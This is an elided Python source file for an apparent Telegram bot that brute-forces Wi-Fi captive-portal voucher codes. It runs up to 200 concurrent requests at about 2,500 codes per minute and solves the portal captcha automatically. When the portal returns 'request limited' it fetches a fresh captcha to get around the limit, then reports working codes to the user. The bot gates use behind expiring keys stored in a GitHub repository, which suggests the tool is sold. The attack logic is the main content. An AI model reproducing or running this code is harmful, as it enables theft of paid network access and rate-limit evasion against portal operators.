...
CONCURRENCY = 200
BATCH_SIZE = 2500
TARGET_SPEED = 2500  # codes per minute (rate limit)
_voucher_sem = None
...
async def create_file_if_missing(path, default_content):
    """Create a file on GitHub if it doesn't exist yet."""
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
    ...
    try:
        async with session.put(url, headers=headers, json=payload, ssl=True) as response:
            if response.status in (200, 201):
                ...
                text = await response.text()
                print(f"[create_file_if_missing] {response.status}: {text[:200]}")
                return None
    except Exception as e:
...
async def ensure_files():
    """Make sure auth_list.json and result.json exist in GitHub repo."""
    auth_list, sha = await get_file_content("auth_list.json")
    if sha is None:
        print("[ensure_files] Creating auth_list.json ...")
        await create_file_if_missing("auth_list.json", {})
    result, sha2 = await get_file_content("result.json")
    if sha2 is None:
        print("[ensure_files] Creating result.json ...")
    ...
    try:
        async with session.put(url, headers=headers, json=payload, ssl=True) as response:
            ...
            if response.status not in (200, 201):
                print(f"[update_file_content] GitHub error {response.status}: {text[:200]}")
            return text
    except Exception as e:
...
async def genkey(message):
    ...
    try:
        ...
        # If file didn't exist yet, sha will be None — create it
        if sha is None:
            new_sha = await create_file_if_missing("auth_list.json", auth_list)
        else:
            await update_file_content(
                "auth_list.json",
                auth_list,
...
async def save_rechecked_codes(chat_id_str, recheck_list, sha):
    try:
        results, fresh_sha = await get_file_content("result.json")
        results[chat_id_str] = recheck_list
        await update_file_content("result.json", results, fresh_sha, f"Update after recheck for {chat_id_str}")
    except Exception as e:
        print(f"[save_rechecked_codes] Error: {e}")

async def check_session_url(session_url):
    # Validate by URL format only — network check causes false rejections
    # due to session expiry or connectivity timing from Replit's servers.
    try:
        ...
        # Must have at least one gateway parameter
        required_any = {"gw_id", "gw_address", "stage", "sessionId"}
        if required_any & set(params.keys()):
            return True
        # Also accept if URL host looks like a portal
        if parsed.netloc:
            return True
        return False
    except Exception as e:
    ...
    async def _update_progress():
        ...
        try:
            ...
            try:
                ...
                print(f"Progress update error: {err}")
    ...
    try:
        while True:
            ...
            if time.monotonic() - last_key_check >= 600:
                try:
                    auth_list, _ = await get_file_content("auth_list.json")
                    if not auth_list.get(str(chat_id)) or not check_key_expiration(auth_list[str(chat_id)]):
                        approve[chat_id] = False
                        await bot.send_message(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                        _cleanup()
                        return
                except Exception as e:
                    print(f"[run_bruteforce] key check error: {e}")
                last_key_check = time.monotonic()
            ...
            # Rate limit to TARGET_SPEED codes/min
        ...
        if progress_msg:
            ...
            try:
                ...
                try:
                    ...
                    print(f"Finish message error: {err}")
        _cleanup()
    finally:
        _cleanup()
...
async def get_session_id(task_session, session_url, previous_session_id=None):
    ...
    try:
        # Do NOT follow redirects — the redirect target is a local LAN IP unreachable from Replit.
        # sessionId is in the Location header of the first (302) response.
        async with task_session.get(session_url, headers=headers, allow_redirects=False) as req:
            # Check Location header first (redirect case)
            location = req.headers.get("Location", "")
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", location)
            if session_id:
                return session_id.group(1)
            # Fallback: check final URL string
            ...
            try:
                body = await req.text()
                session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", body)
                if session_id:
                    return session_id.group(1)
            except Exception:
                pass
        ...
        print(f"[get_session_id] Error: {type(e).__name__}: {e}")
        return previous_session_id
...
async def _get_session_and_captcha(session_url):
    """Open one HTTP session, get session_id, solve captcha. Returns (task_session, session_id, auth_code) or None."""
    ...
    try:
        ...
        return task_session, session_id, auth_code
    except Exception as e:
        print(f"[_get_session_and_captcha] {e}")
        await task_session.close()
        return None, None, None

async def _post_voucher(task_session, session_id, auth_code, code):
    """POST one voucher code. Returns response text or None."""
    data = {
        "accessCode": code,
    ...
    try:
        ...
        print(f"[_post_voucher] {e}")
        return None

async def _notify_success(code, session_id, chat_id, message):
    """Send/update the success message for a found code."""
    ...
    try:
        ...
        print(f"[_notify_success] {e}")

async def _notify_limited(code, session_id, chat_id, message):
    """Send/update the limited message for a found code."""
    ...
    try:
        ...
        print(f"[_notify_limited] {e}")

async def check_codes_shared_captcha(codes, session_url, chat_id, scan_id, message=None):
    """
    Check a list of codes using ONE shared session+captcha.
    If the captcha expires (rate limited), get a new one and continue.
    Returns number of codes actually checked.
    """
    ...
    try:
        for code in codes:
            ...
            response = await _post_voucher(task_session, session_id, auth_code, code)
            checked += 1
            ...
            if 'request limited' in response:
                # Captcha used up — get a fresh one
                await task_session.close()
                task_session, session_id, auth_code = await _get_session_and_captcha(session_url)
                if not task_session:
                    return checked
                # Retry same code with new captcha
                response = await _post_voucher(task_session, session_id, auth_code, code)
                if response is None:
                    continue

            if 'logonUrl' in response:
                await _notify_success(code, session_id, chat_id, message)
            elif 'STA' in response:
                await _notify_limited(code, session_id, chat_id, message)
...
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    """Single-code check used only for /recheck."""
    task_session, session_id, auth_code = await _get_session_and_captcha(session_url)
    if not task_session:
        return None
    try:
...
async def Varify_Captcha(session, session_id, text):
    ...
    try:
        ...
        print(f"[Varify_Captcha] Error: {e}")
        return None
...
async def start_polling():
    ...
    while True:
        try:
            # timeout=60 = long poll wait; request_timeout=90 = total HTTP timeout
